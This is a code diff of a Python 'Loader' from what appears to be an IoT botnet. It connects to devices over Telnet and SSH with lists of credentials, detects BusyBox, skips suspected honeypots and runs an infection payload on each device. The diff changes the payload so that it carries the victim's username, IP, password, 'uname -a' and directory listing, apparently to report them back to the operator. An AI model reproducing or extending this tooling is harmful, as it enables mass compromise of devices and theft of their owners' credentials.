@@ -1,4 +1,4 @@
-from utils_class import Telnet, Database, Console, Tools, Ssh
+from lib import ssh, telnet, console, database, tools
 import argparse, time, threading
 
 __CSTRING__ = '#conn_str#'
@@ -6,8 +6,8 @@ __PAYLOAD__ = '#infect_payload#'
 
 class Loader:
     def __init__(self, ip: str, port: int, thread: int, list_: str, protocol: str):
-        self.console = Console.Console()
-        self.ip_tools = Tools.IP_Tools()
+        self.console = console.Console()
+        self.ip_tools = tools.IP_Tools()
         self.protocol = protocol
         self.thread = thread
         self.devices = []
@@ -18,7 +18,7 @@ class Loader:
     
     def load_device(self):
         if self.list == 'database':
-            for device in Database.Database(__CSTRING__).get_telnet_bot():
+            for device in database.Database(__CSTRING__).get_telnet_bot():
                 self.devices.append(device)
         else:
             with open('./vuln.txt', 'r+') as vuln_file:
@@ -29,13 +29,14 @@ class Loader:
                     except:
                         pass
 
-            self.console.print_success(f'Loading {len(self.devices)} devices')
+        self.console.print_success(f'Loading {len(self.devices)} devices')
 
     def infect_telnet_thread(self, ip: str, port: int, username: str, password: str):
-        Session = Telnet.Telnet(ip, port, username, password)
+        Session = telnet.Telnet(ip, port, username, password)
         self.run += 1
         
         if not Session.connect():
+            self.run -= 1
             return
         
         data = ''
@@ -45,21 +46,22 @@ class Loader:
         for math in ['BusyBox', 'Built-in']:
             if math in data and 'unrecognized' not in data:
                 if Session.run_command('ls /proc/1/') == '' and '@' in Session.prompt():
-                    lookup = self.ip_tools.ip_lookup(ip)
-                    self.console.print_info(f'Honeypot detected: {username}@{ip} -> {lookup["ipType"]} -> {lookup["country"]} -> {Session.prompt()}')
+                    #lookup = self.ip_tools.ip_lookup(ip) / {lookup["ipType"]} -> {lookup["country"]} ->
+                    self.console.print_info(f'Honeypot detected: {username}@{ip} ->  {Session.prompt()}')
                     return
 
-                Session.run_command(__PAYLOAD__)
+                Session.run_command(__PAYLOAD__.replace('xxxx', f'`{username}@{ip}:{password}` - `{Session.run_command("uname -a")}` - `{Session.run_command("ls")}`'))
                 self.console.print_success(f'Infected: {username}@{ip}:{password}')
         
         Session.disconnect()
         self.run -= 1
     
     def infect_ssh_thread(self, ip: str, port: int, username: str, password: str):
-        Session = Ssh.Ssh(ip, port, username, password)
+        Session = ssh.Ssh(ip, port, username, password)
         self.run += 1
         
         if not Session.connect():
+            self.run -= 1
             return
         
         if Session.run_command('ls /proc/1/') == '':
